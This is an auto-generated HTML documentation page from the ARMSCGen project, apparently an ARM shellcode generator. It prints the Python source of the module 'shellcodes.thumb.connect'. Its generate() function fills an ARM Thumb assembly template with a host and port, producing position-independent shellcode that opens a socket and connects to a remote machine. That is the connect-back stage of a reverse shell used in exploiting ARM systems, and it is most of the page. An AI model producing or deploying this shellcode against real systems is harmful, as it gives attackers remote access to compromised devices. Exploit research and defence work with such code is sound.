@@ -1,0 +1,145 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>shellcodes.thumb.connect &mdash; ARMSCGen $0.0.12 documentation</title>
+    
+    <link rel="stylesheet" href="../../../_static/default.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../../../',
+        VERSION:     '$0.0.12',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="../../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../../_static/doctools.js"></script>
+    <link rel="top" title="ARMSCGen $0.0.12 documentation" href="../../../index.html" />
+    <link rel="up" title="Module code" href="../../index.html" /> 
+  </head>
+  <body>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="../../../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li><a href="../../../index.html">ARMSCGen $0.0.12 documentation</a> &raquo;</li>
+          <li><a href="../../index.html" accesskey="U">Module code</a> &raquo;</li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body">
+            
+  <h1>Source code for shellcodes.thumb.connect</h1><div class="highlight"><pre>
+<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="n">htons</span><span class="p">,</span> <span class="n">inet_aton</span><span class="p">,</span> <span class="n">gethostbyname</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">unpack</span>
+
+<div class="viewcode-block" id="binary_ip"><a class="viewcode-back" href="../../../shellcodes.thumb.html#shellcodes.thumb.connect.binary_ip">[docs]</a><span class="k">def</span> <span class="nf">binary_ip</span><span class="p">(</span><span class="n">host</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">inet_aton</span><span class="p">(</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">host</span><span class="p">))</span>
+</div>
+<div class="viewcode-block" id="u32"><a class="viewcode-back" href="../../../shellcodes.thumb.html#shellcodes.thumb.connect.u32">[docs]</a><span class="k">def</span> <span class="nf">u32</span><span class="p">(</span><span class="n">u</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">unpack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="n">u</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</div>
+<div class="viewcode-block" id="generate"><a class="viewcode-back" href="../../../shellcodes.thumb.html#shellcodes.thumb.connect.generate">[docs]</a><span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">31337</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Connects to remote machine on specific port</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        host(str): hostname or IP address</span>
+
+<span class="sd">        port(int/str): specific port</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">sc</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
+<span class="s">    mov r0, #2</span>
+<span class="s">    mov r1, #1</span>
+<span class="s">    sub r2, r2, r2</span>
+<span class="s">    sub r7, r7, r7</span>
+<span class="s">    add r7, r7, #255</span>
+<span class="s">    add r7, r7, #26</span>
+<span class="s">    svc 1</span>
+<span class="s">    #adr r1, sockaddr_1</span>
+<span class="s">    mov r1, pc</span>
+<span class="s">    add r1, #12</span>
+<span class="s">    mov r2, #16</span>
+<span class="s">    mov r3, #2</span>
+<span class="s">    mov r6, r0</span>
+<span class="s">    strh r3, [r1]</span>
+<span class="s">    b after_sockaddr_2</span>
+<span class="s">    sub r1, r1, r1</span>
+
+<span class="s">sockaddr_1:</span>
+<span class="s">    .short 0x4141</span>
+<span class="s">    .short </span><span class="si">%s</span><span class="s"></span>
+<span class="s">    .word  </span><span class="si">%s</span><span class="s"></span>
+<span class="s">    </span>
+<span class="s">after_sockaddr_2:</span>
+<span class="s">    sub r7, r7, r7</span>
+<span class="s">    add r7, r7, #255</span>
+<span class="s">    add r7, r7, #28</span>
+<span class="s">    svc 1</span>
+<span class="s">    &quot;&quot;&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">htons</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)),</span> <span class="n">u32</span><span class="p">(</span><span class="n">binary_ip</span><span class="p">(</span><span class="n">host</span><span class="p">)))</span>
+    <span class="k">return</span> <span class="n">sc</span>
+</div>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">print</span> <span class="n">generate</span><span class="p">()</span>
+</pre></div>
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar">
+        <div class="sphinxsidebarwrapper">
+<div id="searchbox" style="display: none">
+  <h3>Quick search</h3>
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    <p class="searchtip" style="font-size: 90%">
+    Enter search terms or a module, class or function name.
+    </p>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../genindex.html" title="General Index"
+             >index</a></li>
+        <li class="right" >
+          <a href="../../../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li><a href="../../../index.html">ARMSCGen $0.0.12 documentation</a> &raquo;</li>
+          <li><a href="../../index.html" >Module code</a> &raquo;</li> 
+      </ul>
+    </div>
+    <div class="footer">
+        &copy; Copyright 2014, alex.park.
+      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.1.3.
+    </div>
+  </body>
+</html>
